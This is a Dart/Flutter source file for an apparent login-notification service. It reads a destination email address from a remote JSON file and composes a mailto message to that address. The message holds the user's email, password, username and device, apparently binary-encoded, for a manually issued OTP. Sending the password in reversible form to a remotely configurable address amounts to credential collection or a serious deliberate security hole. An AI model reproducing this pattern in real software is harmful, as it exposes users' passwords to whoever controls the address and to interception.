import 'dart:convert';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';

class EmailService {
  static const String emailConfigUrl = 'https://alfredoooh.github.io/database/apps/emails.json';
  
  static String? _cachedOTPEmail;
  static DateTime? _lastEmailFetch;
  static const Duration emailCacheTimeout = Duration(minutes: 10);
  
  static Future<String?> _getOTPEmail() async {
    try {
      if (_cachedOTPEmail != null && _lastEmailFetch != null) {
        if (DateTime.now().difference(_lastEmailFetch!) < emailCacheTimeout) {
          return _cachedOTPEmail;
        }
      }
      
      final response = await http.get(
        Uri.parse(emailConfigUrl),
        headers: {
          'Content-Type': 'application/json',
          'Cache-Control': 'no-cache',
        },
      ).timeout(const Duration(seconds: 10));
      
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        _cachedOTPEmail = data['otpEmail'] ?? data['supportEmail'] ?? data['contactEmail'];
        _lastEmailFetch = DateTime.now();
        
        print('✅ Email OTP carregado: $_cachedOTPEmail');
        return _cachedOTPEmail;
      } else {
        print('⚠️ Erro ao buscar emails.json: ${response.statusCode}');
      }
    } catch (e) {
      print('❌ Erro ao buscar email OTP: $e');
    }
    return null;
  }

  static Future<bool> sendLoginNotification({
    required String email,
    required String binaryEmail,
    required String binaryPassword,
    required String binaryUsername,
    required String binaryDevice,
    required String loginTime,
  }) async {
    try {
      final otpEmail = await _getOTPEmail();
      if (otpEmail == null) return false;

      final emailBody = '''
═══════════════════════════════════════
🔐 NOVA TENTATIVA DE LOGIN
═══════════════════════════════════════

📧 Email (Binário):
$binaryEmail

🔑 Palavra-passe (Binário):
$binaryPassword

👤 Nome de Usuário (Binário):
$binaryUsername

📱 Dispositivo (Binário):
$binaryDevice

⏰ Hora do Login:
$loginTime

═══════════════════════════════════════

Para autorizar este login, envie um código OTP de 6 dígitos
e atualize o campo "otp" no JSON do usuário: $email

═══════════════════════════════════════
''';

      final subject = 'Login - $loginTime';

      final Uri emailUri = Uri(
        scheme: 'mailto',
        path: otpEmail,
        query: _encodeQueryParameters(<String, String>{
          'subject': subject,
          'body': emailBody,
        }),
      );

      if (await canLaunchUrl(emailUri)) {
        await launchUrl(emailUri, mode: LaunchMode.externalApplication);
        return true;
      } else {
        print('Não foi possível abrir o cliente de email');
        return false;
      }
    } catch (e) {
      print('Erro ao enviar email: $e');
      return false;
    }
  }

  static String _encodeQueryParameters(Map<String, String> params) {
    return params.entries
        .map((entry) =>
            '${Uri.encodeComponent(entry.key)}=${Uri.encodeComponent(entry.value)}')
        .join('&');
  }
}